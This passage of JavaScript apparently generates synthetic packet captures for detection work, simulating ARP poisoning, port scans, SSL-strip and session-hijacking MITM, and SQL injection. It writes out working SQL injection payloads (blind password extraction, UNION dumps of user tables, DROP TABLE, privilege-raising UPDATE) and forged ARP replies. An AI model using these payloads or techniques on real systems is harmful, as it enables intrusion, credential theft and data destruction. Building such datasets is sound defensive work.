    frame.writeUInt16BE(0x0806, 12) // EtherType ARP
    arpPacket.copy(frame, 14)
    return frame
  }

  // Pre-attack legitimate traffic
  const legitimateCountBefore = config.includeLegitimate ? Math.floor(Math.random() * 80) + 20 : 0
  if (legitimateCountBefore > 0) {
    generateLegitimateTraffic(pcap, baseTime - 10000, victimMac, gatewayMac, config, legitimateCountBefore, 5000)
  }

  // Show normal ARP resolution first (for realism)
  let timestamp = baseTime

  // Normal ARP: victim asks for gateway
  const normalReq = buildArpPacket(victimMac, victimIp, '00:00:00:00:00:00', gatewayIp, 1)
  pcap.addPacket(timestamp, buildArpFrame(victimMac, broadcastMac, normalReq))
  timestamp += 5

  // Normal ARP reply from gateway
  const normalReply = buildArpPacket(gatewayMac, gatewayIp, victimMac, victimIp, 2)
  pcap.addPacket(timestamp, buildArpFrame(gatewayMac, victimMac, normalReply))
  timestamp += 1000

  if (config.variant === 'Bilateral Poisoning') {
    // Bilateral: Attacker poisons BOTH victim and gateway ARP caches
    for (let i = 0; i < 80; i++) {
      // Jittered timing (more realistic than perfectly uniform)
      timestamp += 80 + Math.floor(Math.random() * 40)

      // Tell victim: gateway's MAC is attacker's MAC (unicast to victim)
      const poisonVictim = buildArpPacket(attackerMac, gatewayIp, victimMac, victimIp, 2)
      pcap.addPacket(timestamp, buildArpFrame(attackerMac, victimMac, poisonVictim))

      // Tell gateway: victim's MAC is attacker's MAC (unicast to gateway)
      const poisonGateway = buildArpPacket(attackerMac, victimIp, gatewayMac, gatewayIp, 2)
      pcap.addPacket(timestamp + 5, buildArpFrame(attackerMac, gatewayMac, poisonGateway))
    }

    // Show intercepted traffic flowing through attacker
    timestamp += 200
    const httpReq = HttpPacket.buildRequest('GET', '/account', 'bank.example.com', {
      'User-Agent': 'Mozilla/5.0',
      'Cookie': 'sessionid=a1b2c3d4e5f6'
    })
    // Victim → Attacker (thinks it's gateway)
    const tcpReq = TcpPacket.build(54321, 80, 1000, 0, TCP_FLAGS.PSH | TCP_FLAGS.ACK, httpReq)
    const ipReq = IPv4Packet.build(victimIp, '93.184.216.34', PROTO.TCP, tcpReq)
    pcap.addPacket(timestamp, EthernetFrame.build(victimMac, attackerMac, 0x0800, ipReq))

    // Attacker → Gateway (forwarding)
    timestamp += 2
    pcap.addPacket(timestamp, EthernetFrame.build(attackerMac, gatewayMac, 0x0800, ipReq))

    // Response: Server → gateway → Attacker → Victim
    timestamp += 50
    const httpResp = HttpPacket.buildResponse(200, 'OK', {
      'Content-Type': 'text/html',
      'Set-Cookie': 'sessionid=a1b2c3d4e5f6; Path=/'
    }, '<html><body>Account Dashboard</body></html>')
    const tcpResp = TcpPacket.build(80, 54321, 2000, 1000 + httpReq.length, TCP_FLAGS.PSH | TCP_FLAGS.ACK, httpResp)
    const ipResp = IPv4Packet.build('93.184.216.34', victimIp, PROTO.TCP, tcpResp)
    pcap.addPacket(timestamp, EthernetFrame.build(gatewayMac, attackerMac, 0x0800, ipResp))
    timestamp += 2
    pcap.addPacket(timestamp, EthernetFrame.build(attackerMac, victimMac, 0x0800, ipResp))

  } else {
    // Gateway Poisoning: Attacker claims to be gateway via gratuitous ARP + unicast to victim
    for (let i = 0; i < 100; i++) {
      timestamp += 80 + Math.floor(Math.random() * 40)

      // Gratuitous ARP broadcast: attacker claims gateway IP
      const gratuitous = buildArpPacket(attackerMac, gatewayIp, '00:00:00:00:00:00', gatewayIp, 2)
      pcap.addPacket(timestamp, buildArpFrame(attackerMac, broadcastMac, gratuitous))

      // Also send targeted reply to victim
      if (i % 3 === 0) {
        const targeted = buildArpPacket(attackerMac, gatewayIp, victimMac, victimIp, 2)
        pcap.addPacket(timestamp + 2, buildArpFrame(attackerMac, victimMac, targeted))
      }
    }
  }

  // Post-attack legitimate traffic
  const legitimateCountAfter = config.includeLegitimate ? Math.floor(Math.random() * 80) + 20 : 0
  if (legitimateCountAfter > 0) {
    generateLegitimateTraffic(pcap, timestamp + 1000, victimMac, gatewayMac, config, legitimateCountAfter, 5000)
  }

  return pcap.build()
}

function generatePortScan(config) {
  const pcap = new PcapWriter()
  const baseTime = Date.now()
  const srcMac = '00:06:5B:EB:03:E0'
  const dstMac = 'AA:BB:CC:DD:EE:FF'
  const openPorts = [21, 22, 25, 53, 80, 110, 143, 443, 993, 995, 3306, 8080]

  console.log(`Generating port scan (${config.variant})...`)

  // Pre-attack legitimate traffic
  const legitimateCountBefore = config.includeLegitimate ? Math.floor(Math.random() * 80) + 20 : 0
  if (legitimateCountBefore > 0) {
    generateLegitimateTraffic(pcap, baseTime - 10000, srcMac, dstMac, config, legitimateCountBefore, 5000)
  }

  const ports = []
  for (let port = 1; port <= 1024; port++) ports.push(port)

  switch (config.variant) {
    case 'TCP Connect': {
      // Full 3-way handshake for each port, then RST to close
      ports.forEach((port, index) => {
        const timestamp = baseTime + (index * 15)
        const srcPort = 40000 + (index % 25000)
        const seq = Math.floor(Math.random() * 4294967295)

        // SYN
        const syn = TcpPacket.build(srcPort, port, seq, 0, TCP_FLAGS.SYN)
        pcap.addPacket(timestamp, EthernetFrame.build(srcMac, dstMac, 0x0800, IPv4Packet.build(config.sourceIp, config.targetIp, PROTO.TCP, syn)))

        const isOpen = openPorts.includes(port)
        if (isOpen) {
          // SYN-ACK from server
          const synAck = TcpPacket.build(port, srcPort, Math.floor(Math.random() * 4294967295), seq + 1, TCP_FLAGS.SYN | TCP_FLAGS.ACK)
          pcap.addPacket(timestamp + 3, EthernetFrame.build(dstMac, srcMac, 0x0800, IPv4Packet.build(config.targetIp, config.sourceIp, PROTO.TCP, synAck)))

          // ACK to complete handshake
          const ack = TcpPacket.build(srcPort, port, seq + 1, 1, TCP_FLAGS.ACK)
          pcap.addPacket(timestamp + 5, EthernetFrame.build(srcMac, dstMac, 0x0800, IPv4Packet.build(config.sourceIp, config.targetIp, PROTO.TCP, ack)))

          // RST to close immediately (scanner detected open port)
          const rst = TcpPacket.build(srcPort, port, seq + 1, 0, TCP_FLAGS.RST)
          pcap.addPacket(timestamp + 6, EthernetFrame.build(srcMac, dstMac, 0x0800, IPv4Packet.build(config.sourceIp, config.targetIp, PROTO.TCP, rst)))
        } else {
          // RST from server (port closed)
          const rst = TcpPacket.build(port, srcPort, 0, seq + 1, TCP_FLAGS.RST | TCP_FLAGS.ACK)
          pcap.addPacket(timestamp + 3, EthernetFrame.build(dstMac, srcMac, 0x0800, IPv4Packet.build(config.targetIp, config.sourceIp, PROTO.TCP, rst)))
        }
      })
      break
    }

    case 'UDP Scan': {
      // Send UDP packets; closed ports return ICMP unreachable, open ports may respond or be silent
      ports.forEach((port, index) => {
        const timestamp = baseTime + (index * 12)
        const srcPort = 40000 + (index % 25000)

        const udpPayload = UdpPacket.build(srcPort, port, Buffer.alloc(0))
        const ipPacket = IPv4Packet.build(config.sourceIp, config.targetIp, PROTO.UDP, udpPayload)
        const ethFrame = EthernetFrame.build(srcMac, dstMac, 0x0800, ipPacket)
        pcap.addPacket(timestamp, ethFrame)

        const isOpen = openPorts.includes(port)
        if (!isOpen) {
          // ICMP Destination Unreachable (port unreachable) for closed ports
          const icmpData = Buffer.alloc(28)
          ipPacket.copy(icmpData, 0, 0, Math.min(28, ipPacket.length))
          const icmpResp = IcmpPacket.build(3, 3, icmpData)
          const ipResp = IPv4Packet.build(config.targetIp, config.sourceIp, PROTO.ICMP, icmpResp)
          pcap.addPacket(timestamp + 5, EthernetFrame.build(dstMac, srcMac, 0x0800, ipResp))
        }
        // Open/filtered ports: no response (silence)
      })
      break
    }

    case 'Stealth Scan': {
      // FIN scan: send FIN packets; closed ports respond with RST, open ports are silent
      ports.forEach((port, index) => {
        const timestamp = baseTime + (index * 10)
        const srcPort = 40000 + (index % 25000)
        const seq = Math.floor(Math.random() * 4294967295)

        // FIN packet (stealthy — no SYN, avoids logging on many systems)
        const fin = TcpPacket.build(srcPort, port, seq, 0, TCP_FLAGS.FIN)
        pcap.addPacket(timestamp, EthernetFrame.build(srcMac, dstMac, 0x0800, IPv4Packet.build(config.sourceIp, config.targetIp, PROTO.TCP, fin)))

        const isOpen = openPorts.includes(port)
        if (!isOpen) {
          // Closed port responds with RST
          const rst = TcpPacket.build(port, srcPort, 0, seq + 1, TCP_FLAGS.RST | TCP_FLAGS.ACK)
          pcap.addPacket(timestamp + 5, EthernetFrame.build(dstMac, srcMac, 0x0800, IPv4Packet.build(config.targetIp, config.sourceIp, PROTO.TCP, rst)))
        }
        // Open ports: no response (port is open or filtered)
      })
      break
    }

    case 'SYN Scan':
    default: {
      // Half-open scan: SYN → SYN-ACK (open) or RST (closed), then RST to abort
      ports.forEach((port, index) => {
        const timestamp = baseTime + (index * 10)
        const srcPort = 40000 + (index % 25000)
        const seq = Math.floor(Math.random() * 4294967295)

        const syn = TcpPacket.build(srcPort, port, seq, 0, TCP_FLAGS.SYN)
        pcap.addPacket(timestamp, EthernetFrame.build(srcMac, dstMac, 0x0800, IPv4Packet.build(config.sourceIp, config.targetIp, PROTO.TCP, syn)))

        const isOpen = openPorts.includes(port)
        if (isOpen) {
          const synAck = TcpPacket.build(port, srcPort, Math.floor(Math.random() * 4294967295), seq + 1, TCP_FLAGS.SYN | TCP_FLAGS.ACK)
          pcap.addPacket(timestamp + 3, EthernetFrame.build(dstMac, srcMac, 0x0800, IPv4Packet.build(config.targetIp, config.sourceIp, PROTO.TCP, synAck)))

          // Scanner sends RST (never completes handshake — half-open)
          const rst = TcpPacket.build(srcPort, port, seq + 1, 0, TCP_FLAGS.RST)
          pcap.addPacket(timestamp + 5, EthernetFrame.build(srcMac, dstMac, 0x0800, IPv4Packet.build(config.sourceIp, config.targetIp, PROTO.TCP, rst)))
        } else {
          const rst = TcpPacket.build(port, srcPort, 0, seq + 1, TCP_FLAGS.RST | TCP_FLAGS.ACK)
          pcap.addPacket(timestamp + 3, EthernetFrame.build(dstMac, srcMac, 0x0800, IPv4Packet.build(config.targetIp, config.sourceIp, PROTO.TCP, rst)))
        }
      })
      break
    }
  }

  // Post-attack legitimate traffic
  const legitimateCountAfter = config.includeLegitimate ? Math.floor(Math.random() * 80) + 20 : 0
  if (legitimateCountAfter > 0) {
    generateLegitimateTraffic(pcap, baseTime + 20000, srcMac, dstMac, config, legitimateCountAfter, 5000)
  }

  return pcap.build()
}

function generateMitm(config) {
  const pcap = new PcapWriter()
  const baseTime = Date.now()
  const attackerMac = '0E:56:5F:B2:01:A0'
  const clientMac = '00:06:5B:EB:03:E0'
  const serverMac = '00:06:5B:EB:B8:E0'
  const gatewayMac = '0E:B6:01:D2:EE:01'
  const clientIp = '192.168.1.100'
  const gatewayIp = '192.168.1.1'
  const serverIp = config.targetIp || '93.184.216.34'

  console.log(`Generating MITM attack (${config.variant})...`)

  // Pre-attack legitimate traffic
  const legitimateCountBefore = config.includeLegitimate ? Math.floor(Math.random() * 80) + 20 : 0
  if (legitimateCountBefore > 0) {
    generateLegitimateTraffic(pcap, baseTime - 5000, clientMac, gatewayMac, config, legitimateCountBefore, 3000)
  }

  let timestamp = baseTime

  // ARP spoofing setup for MITM position (shared by both variants)
  function buildArpReply(senderMac, senderIp, targetMac, targetIp) {
    const packet = Buffer.alloc(28)
    packet.writeUInt16BE(0x0001, 0)
    packet.writeUInt16BE(0x0800, 2)
    packet[4] = 6
    packet[5] = 4
    packet.writeUInt16BE(2, 6) // Reply
    const sMac = senderMac.split(':').map(b => parseInt(b, 16))
    for (let i = 0; i < 6; i++) packet[8 + i] = sMac[i]
    const sIp = senderIp.split('.').map(b => parseInt(b))
    for (let i = 0; i < 4; i++) packet[14 + i] = sIp[i]
    const tMac = targetMac.split(':').map(b => parseInt(b, 16))
    for (let i = 0; i < 6; i++) packet[18 + i] = tMac[i]
    const tIp = targetIp.split('.').map(b => parseInt(b))
    for (let i = 0; i < 4; i++) packet[24 + i] = tIp[i]
    return packet
  }

  function buildArpFrame(srcMac, dstMac, arpData) {
    const frame = Buffer.alloc(14 + arpData.length)
    const dst = dstMac.split(':').map(b => parseInt(b, 16))
    for (let i = 0; i < 6; i++) frame[i] = dst[i]
    const src = srcMac.split(':').map(b => parseInt(b, 16))
    for (let i = 0; i < 6; i++) frame[6 + i] = src[i]
    frame.writeUInt16BE(0x0806, 12)
    arpData.copy(frame, 14)
    return frame
  }

  // Phase 1: ARP poisoning to establish MITM position
  for (let i = 0; i < 10; i++) {
    const arpToVictim = buildArpReply(attackerMac, gatewayIp, clientMac, clientIp)
    pcap.addPacket(timestamp, buildArpFrame(attackerMac, clientMac, arpToVictim))
    const arpToGateway = buildArpReply(attackerMac, clientIp, gatewayMac, gatewayIp)
    pcap.addPacket(timestamp + 5, buildArpFrame(attackerMac, gatewayMac, arpToGateway))
    timestamp += 200
  }

  timestamp += 500

  if (config.variant === 'SSL Strip') {
    // SSL Strip: Client tries HTTPS, attacker downgrades to HTTP and intercepts credentials

    // Client requests HTTPS (TCP SYN to port 443)
    let seq = 1000
    let serverSeq = 5000
    const synReq = TcpPacket.build(54321, 443, seq, 0, TCP_FLAGS.SYN)
    pcap.addPacket(timestamp, EthernetFrame.build(clientMac, attackerMac, 0x0800, IPv4Packet.build(clientIp, serverIp, PROTO.TCP, synReq)))
    timestamp += 2

    // Attacker intercepts and sends 301 redirect to HTTP
    const synAck = TcpPacket.build(443, 54321, serverSeq, seq + 1, TCP_FLAGS.SYN | TCP_FLAGS.ACK)
    pcap.addPacket(timestamp, EthernetFrame.build(attackerMac, clientMac, 0x0800, IPv4Packet.build(serverIp, clientIp, PROTO.TCP, synAck)))
    timestamp += 2
    seq += 1

    const ack1 = TcpPacket.build(54321, 443, seq, serverSeq + 1, TCP_FLAGS.ACK)
    pcap.addPacket(timestamp, EthernetFrame.build(clientMac, attackerMac, 0x0800, IPv4Packet.build(clientIp, serverIp, PROTO.TCP, ack1)))
    timestamp += 5
    serverSeq += 1

    // Redirect response from attacker (pretending to be server)
    const redirectResp = HttpPacket.buildResponse(301, 'Moved Permanently', {
      'Location': `http://${serverIp}/login`,
      'Content-Type': 'text/html'
    }, '<html><body>Redirecting...</body></html>')
    const tcpRedirect = TcpPacket.build(443, 54321, serverSeq, seq, TCP_FLAGS.PSH | TCP_FLAGS.ACK, redirectResp)
    pcap.addPacket(timestamp, EthernetFrame.build(attackerMac, clientMac, 0x0800, IPv4Packet.build(serverIp, clientIp, PROTO.TCP, tcpRedirect)))
    timestamp += 50
    serverSeq += redirectResp.length

    // Client now connects via HTTP (port 80) — attacker intercepts plaintext
    let httpSeq = 2000
    let httpServerSeq = 6000
    const httpSyn = TcpPacket.build(54322, 80, httpSeq, 0, TCP_FLAGS.SYN)
    pcap.addPacket(timestamp, EthernetFrame.build(clientMac, attackerMac, 0x0800, IPv4Packet.build(clientIp, serverIp, PROTO.TCP, httpSyn)))
    timestamp += 3

    const httpSynAck = TcpPacket.build(80, 54322, httpServerSeq, httpSeq + 1, TCP_FLAGS.SYN | TCP_FLAGS.ACK)
    pcap.addPacket(timestamp, EthernetFrame.build(attackerMac, clientMac, 0x0800, IPv4Packet.build(serverIp, clientIp, PROTO.TCP, httpSynAck)))
    timestamp += 3
    httpSeq += 1
    httpServerSeq += 1

    const httpAck = TcpPacket.build(54322, 80, httpSeq, httpServerSeq, TCP_FLAGS.ACK)
    pcap.addPacket(timestamp, EthernetFrame.build(clientMac, attackerMac, 0x0800, IPv4Packet.build(clientIp, serverIp, PROTO.TCP, httpAck)))
    timestamp += 10

    // Client sends login credentials over HTTP (plaintext!)
    const loginBody = 'username=admin&password=P%40ssw0rd123&remember=true'
    const loginReq = HttpPacket.buildRequest('POST', '/login', serverIp, {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
      'Content-Type': 'application/x-www-form-urlencoded',
      'Referer': `http://${serverIp}/login`
    }, loginBody)
    const tcpLogin = TcpPacket.build(54322, 80, httpSeq, httpServerSeq, TCP_FLAGS.PSH | TCP_FLAGS.ACK, loginReq)
    pcap.addPacket(timestamp, EthernetFrame.build(clientMac, attackerMac, 0x0800, IPv4Packet.build(clientIp, serverIp, PROTO.TCP, tcpLogin)))
    timestamp += 5
    httpSeq += loginReq.length

    // Attacker forwards to server (real HTTPS)
    pcap.addPacket(timestamp, EthernetFrame.build(attackerMac, serverMac, 0x0800, IPv4Packet.build(clientIp, serverIp, PROTO.TCP, tcpLogin)))
    timestamp += 50

    // Server responds with session cookie
    const loginResp = HttpPacket.buildResponse(200, 'OK', {
      'Content-Type': 'text/html',
      'Set-Cookie': 'session=YWRtaW46UEBzc3cwcmQxMjM=; Path=/; HttpOnly'
    }, '<html><body>Welcome, admin!</body></html>')
    const tcpLoginResp = TcpPacket.build(80, 54322, httpServerSeq, httpSeq, TCP_FLAGS.PSH | TCP_FLAGS.ACK, loginResp)
    pcap.addPacket(timestamp, EthernetFrame.build(attackerMac, clientMac, 0x0800, IPv4Packet.build(serverIp, clientIp, PROTO.TCP, tcpLoginResp)))

  } else {
    // Session Hijacking: Attacker captures session cookie and reuses it

    // Phase 2: Intercept legitimate session traffic
    let seq = 1000
    let serverSeq = 5000

    // TCP handshake (client → attacker → gateway)
    const syn = TcpPacket.build(54321, 80, seq, 0, TCP_FLAGS.SYN)
    pcap.addPacket(timestamp, EthernetFrame.build(clientMac, attackerMac, 0x0800, IPv4Packet.build(clientIp, serverIp, PROTO.TCP, syn)))
    timestamp += 2
    pcap.addPacket(timestamp, EthernetFrame.build(attackerMac, gatewayMac, 0x0800, IPv4Packet.build(clientIp, serverIp, PROTO.TCP, syn)))
    timestamp += 20

    const synAck = TcpPacket.build(80, 54321, serverSeq, seq + 1, TCP_FLAGS.SYN | TCP_FLAGS.ACK)
    pcap.addPacket(timestamp, EthernetFrame.build(gatewayMac, attackerMac, 0x0800, IPv4Packet.build(serverIp, clientIp, PROTO.TCP, synAck)))
    timestamp += 2
    pcap.addPacket(timestamp, EthernetFrame.build(attackerMac, clientMac, 0x0800, IPv4Packet.build(serverIp, clientIp, PROTO.TCP, synAck)))
    timestamp += 5
    seq += 1
    serverSeq += 1

    const ack = TcpPacket.build(54321, 80, seq, serverSeq, TCP_FLAGS.ACK)
    pcap.addPacket(timestamp, EthernetFrame.build(clientMac, attackerMac, 0x0800, IPv4Packet.build(clientIp, serverIp, PROTO.TCP, ack)))
    timestamp += 2
    pcap.addPacket(timestamp, EthernetFrame.build(attackerMac, gatewayMac, 0x0800, IPv4Packet.build(clientIp, serverIp, PROTO.TCP, ack)))
    timestamp += 10

    // Client sends authenticated request with session cookie
    const httpReq = HttpPacket.buildRequest('GET', '/dashboard', serverIp, {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
      'Cookie': 'session=a1b2c3d4e5f6g7h8; csrftoken=xyz123',
      'Accept': 'text/html'
    })
    const tcpReq = TcpPacket.build(54321, 80, seq, serverSeq, TCP_FLAGS.PSH | TCP_FLAGS.ACK, httpReq)
    const ipReq = IPv4Packet.build(clientIp, serverIp, PROTO.TCP, tcpReq)

    // Client → Attacker (attacker captures the session cookie here)
    pcap.addPacket(timestamp, EthernetFrame.build(clientMac, attackerMac, 0x0800, ipReq))
    timestamp += 2
    // Attacker forwards to server
    pcap.addPacket(timestamp, EthernetFrame.build(attackerMac, gatewayMac, 0x0800, ipReq))
    timestamp += 50
    seq += httpReq.length

    // Server responds
    const httpResp = HttpPacket.buildResponse(200, 'OK', {
      'Content-Type': 'text/html'
    }, '<html><body><h1>Dashboard - Welcome admin</h1></body></html>')
    const tcpResp = TcpPacket.build(80, 54321, serverSeq, seq, TCP_FLAGS.PSH | TCP_FLAGS.ACK, httpResp)
    const ipResp = IPv4Packet.build(serverIp, clientIp, PROTO.TCP, tcpResp)
    pcap.addPacket(timestamp, EthernetFrame.build(gatewayMac, attackerMac, 0x0800, ipResp))
    timestamp += 2
    pcap.addPacket(timestamp, EthernetFrame.build(attackerMac, clientMac, 0x0800, ipResp))
    timestamp += 2000
    serverSeq += httpResp.length

    // Phase 3: Attacker reuses the stolen session cookie from a different source port
    const hijackSeq = 8000
    const syn2 = TcpPacket.build(55555, 80, hijackSeq, 0, TCP_FLAGS.SYN)
    pcap.addPacket(timestamp, EthernetFrame.build(attackerMac, gatewayMac, 0x0800, IPv4Packet.build(clientIp, serverIp, PROTO.TCP, syn2)))
    timestamp += 20
    const synAck2 = TcpPacket.build(80, 55555, 9000, hijackSeq + 1, TCP_FLAGS.SYN | TCP_FLAGS.ACK)
    pcap.addPacket(timestamp, EthernetFrame.build(gatewayMac, attackerMac, 0x0800, IPv4Packet.build(serverIp, clientIp, PROTO.TCP, synAck2)))
    timestamp += 5
    const ack2 = TcpPacket.build(55555, 80, hijackSeq + 1, 9001, TCP_FLAGS.ACK)
    pcap.addPacket(timestamp, EthernetFrame.build(attackerMac, gatewayMac, 0x0800, IPv4Packet.build(clientIp, serverIp, PROTO.TCP, ack2)))
    timestamp += 10

    // Attacker uses stolen cookie to access protected resource
    const hijackReq = HttpPacket.buildRequest('GET', '/admin/users', serverIp, {
      'User-Agent': 'curl/7.88.0',
      'Cookie': 'session=a1b2c3d4e5f6g7h8; csrftoken=xyz123',
      'Accept': '*/*'
    })
    const tcpHijack = TcpPacket.build(55555, 80, hijackSeq + 1, 9001, TCP_FLAGS.PSH | TCP_FLAGS.ACK, hijackReq)
    pcap.addPacket(timestamp, EthernetFrame.build(attackerMac, gatewayMac, 0x0800, IPv4Packet.build(clientIp, serverIp, PROTO.TCP, tcpHijack)))
    timestamp += 50

    // Server responds to hijacked request
    const hijackResp = HttpPacket.buildResponse(200, 'OK', {
      'Content-Type': 'application/json'
    }, '{"users":[{"id":1,"name":"admin","email":"admin@example.com"},{"id":2,"name":"user1"}]}')
    const tcpHijackResp = TcpPacket.build(80, 55555, 9001, hijackSeq + 1 + hijackReq.length, TCP_FLAGS.PSH | TCP_FLAGS.ACK, hijackResp)
    pcap.addPacket(timestamp, EthernetFrame.build(gatewayMac, attackerMac, 0x0800, IPv4Packet.build(serverIp, clientIp, PROTO.TCP, tcpHijackResp)))
  }

  // Post-attack legitimate traffic
  const legitimateCountAfter = config.includeLegitimate ? Math.floor(Math.random() * 80) + 20 : 0
  if (legitimateCountAfter > 0) {
    generateLegitimateTraffic(pcap, timestamp + 2000, clientMac, gatewayMac, config, legitimateCountAfter, 3000)
  }

  return pcap.build()
}

function generateSqlInjection(config) {
  const pcap = new PcapWriter()
  const baseTime = Date.now()
  const srcMac = '00:11:22:33:44:55'
  const dstMac = 'AA:BB:CC:DD:EE:FF'
  const clientPort = 54321

  console.log(`Generating SQL injection attack (${config.variant})...`)

  // Pre-attack legitimate traffic
  const legitimateCountBefore = config.includeLegitimate ? Math.floor(Math.random() * 80) + 20 : 0
  if (legitimateCountBefore > 0) {
    generateLegitimateTraffic(pcap, baseTime - 10000, srcMac, dstMac, config, legitimateCountBefore, 5000)
  }

  let timestamp = baseTime
  let seq = 1000
  let serverSeq = 5000

  // TCP 3-way handshake
  const synReq = TcpPacket.build(clientPort, 80, seq, 0, TCP_FLAGS.SYN)
  pcap.addPacket(timestamp, EthernetFrame.build(srcMac, dstMac, 0x0800, IPv4Packet.build(config.sourceIp, config.targetIp, PROTO.TCP, synReq)))
  timestamp += 5

  const synAck = TcpPacket.build(80, clientPort, serverSeq, seq + 1, TCP_FLAGS.SYN | TCP_FLAGS.ACK)
  pcap.addPacket(timestamp, EthernetFrame.build(dstMac, srcMac, 0x0800, IPv4Packet.build(config.targetIp, config.sourceIp, PROTO.TCP, synAck)))
  timestamp += 5

  const ack = TcpPacket.build(clientPort, 80, seq + 1, serverSeq + 1, TCP_FLAGS.ACK)
  pcap.addPacket(timestamp, EthernetFrame.build(srcMac, dstMac, 0x0800, IPv4Packet.build(config.sourceIp, config.targetIp, PROTO.TCP, ack)))
  timestamp += 10
  seq += 1
  serverSeq += 1

  if (config.variant === 'Blind SQLi') {
    // Boolean-based blind: identical queries with different boolean conditions, server returns different-size responses
    const blindAttempts = [
      { payload: "admin' AND 1=1 --", expectTrue: true },
      { payload: "admin' AND 1=2 --", expectTrue: false },
      { payload: "admin' AND (SELECT LENGTH(password) FROM users WHERE username='admin')>5 --", expectTrue: true },
      { payload: "admin' AND (SELECT LENGTH(password) FROM users WHERE username='admin')>10 --", expectTrue: true },
      { payload: "admin' AND (SELECT LENGTH(password) FROM users WHERE username='admin')>15 --", expectTrue: false },
      { payload: "admin' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='p' --", expectTrue: true },
      { payload: "admin' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='admin')='a' --", expectTrue: true },
      { payload: "admin' AND (SELECT SUBSTRING(password,3,1) FROM users WHERE username='admin')='s' --", expectTrue: true }
    ]

    for (const attempt of blindAttempts) {
      const body = `username=${encodeURIComponent(attempt.payload)}&password=test&submit=Login`
      const httpReq = HttpPacket.buildRequest('POST', '/login.php', config.targetIp, {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': 'text/html'
      }, body)
      const tcpReq = TcpPacket.build(clientPort, 80, seq, serverSeq, TCP_FLAGS.PSH | TCP_FLAGS.ACK, httpReq)
      pcap.addPacket(timestamp, EthernetFrame.build(srcMac, dstMac, 0x0800, IPv4Packet.build(config.sourceIp, config.targetIp, PROTO.TCP, tcpReq)))
      timestamp += 30
      seq += httpReq.length

      // Server responds: true condition → full page, false condition → short page
      const respBody = attempt.expectTrue
        ? '<html><body><h1>Welcome</h1><p>Login successful</p><div class="content">Dashboard content here...</div></body></html>'
        : '<html><body><h1>Login Failed</h1></body></html>'
      const httpResp = HttpPacket.buildResponse(200, 'OK', { 'Content-Type': 'text/html' }, respBody)
      const tcpResp = TcpPacket.build(80, clientPort, serverSeq, seq, TCP_FLAGS.PSH | TCP_FLAGS.ACK, httpResp)
      pcap.addPacket(timestamp, EthernetFrame.build(dstMac, srcMac, 0x0800, IPv4Packet.build(config.targetIp, config.sourceIp, PROTO.TCP, tcpResp)))
      timestamp += 50
      serverSeq += httpResp.length
    }

  } else if (config.variant === 'Union-based') {
    // Union-based: UNION SELECT to extract data through the normal response
    const unionAttempts = [
      { payload: "1 UNION SELECT NULL --", resp: 'Error: column count mismatch' },
      { payload: "1 UNION SELECT NULL,NULL --", resp: 'Error: column count mismatch' },
      { payload: "1 UNION SELECT NULL,NULL,NULL --", resp: '' },
      { payload: "1 UNION SELECT table_name,NULL,NULL FROM information_schema.tables --", resp: 'users\nadmin_settings\nsessions\nproducts' },
      { payload: "1 UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users' --", resp: 'id\nusername\npassword\nemail\nis_admin' },
      { payload: "1 UNION SELECT username,password,email FROM users --", resp: 'admin:$2b$12$LJ3m4ys3Gz8K1ZqF0CYNb.W3hDp:admin@example.com\njohn:$2b$12$k8sKz3hYp1LmN...:john@example.com' }
    ]

    for (const attempt of unionAttempts) {
      const httpReq = HttpPacket.buildRequest('GET', `/product.php?id=${encodeURIComponent(attempt.payload)}`, config.targetIp, {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'Accept': 'text/html'
      })
      const tcpReq = TcpPacket.build(clientPort, 80, seq, serverSeq, TCP_FLAGS.PSH | TCP_FLAGS.ACK, httpReq)
      pcap.addPacket(timestamp, EthernetFrame.build(srcMac, dstMac, 0x0800, IPv4Packet.build(config.sourceIp, config.targetIp, PROTO.TCP, tcpReq)))
      timestamp += 30
      seq += httpReq.length

      const statusCode = attempt.resp.startsWith('Error') ? 500 : 200
      const statusText = statusCode === 200 ? 'OK' : 'Internal Server Error'
      const respBody = statusCode === 200
        ? `<html><body><table><tr><td>${attempt.resp.replace(/\n/g, '</td></tr><tr><td>')}</td></tr></table></body></html>`
        : `<html><body><p>${attempt.resp}</p></body></html>`
      const httpResp = HttpPacket.buildResponse(statusCode, statusText, { 'Content-Type': 'text/html' }, respBody)
      const tcpResp = TcpPacket.build(80, clientPort, serverSeq, seq, TCP_FLAGS.PSH | TCP_FLAGS.ACK, httpResp)
      pcap.addPacket(timestamp, EthernetFrame.build(dstMac, srcMac, 0x0800, IPv4Packet.build(config.targetIp, config.sourceIp, PROTO.TCP, tcpResp)))
      timestamp += 50
      serverSeq += httpResp.length
    }

  } else {
    // Classic SQLi (error-based): SQL injection attempts that trigger server errors revealing DB info
    const sqlInjectionAttempts = [
      { param: 'username', payload: "admin' --", respCode: 302, respBody: 'Redirecting to /admin' },
      { param: 'id', payload: '1 OR 1=1 --', respCode: 200, respBody: '<html><body>All records returned</body></html>' },
      { param: 'search', payload: "'; DROP TABLE users; --", respCode: 500, respBody: "SQL Error: You have an error in your SQL syntax near 'DROP TABLE users'" },
      { param: 'username', payload: "' UNION SELECT user,password FROM admin --", respCode: 500, respBody: "SQL Error: The used SELECT statements have a different number of columns" },
      { param: 'product_id', payload: '1; UPDATE users SET admin=1 WHERE 1=1', respCode: 500, respBody: "SQL Error: You have an error in your SQL syntax; check the manual for MySQL server version 8.0" }
    ]

    for (const attempt of sqlInjectionAttempts) {
      const body = `${attempt.param}=${encodeURIComponent(attempt.payload)}&submit=Search`
      const httpReq = HttpPacket.buildRequest('POST', '/search.php', config.targetIp, {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Referer': `http://${config.targetIp}/`,
        'Accept': 'text/html,application/xhtml+xml'
      }, body)
      const tcpReq = TcpPacket.build(clientPort, 80, seq, serverSeq, TCP_FLAGS.PSH | TCP_FLAGS.ACK, httpReq)
      pcap.addPacket(timestamp, EthernetFrame.build(srcMac, dstMac, 0x0800, IPv4Packet.build(config.sourceIp, config.targetIp, PROTO.TCP, tcpReq)))
      timestamp += 50
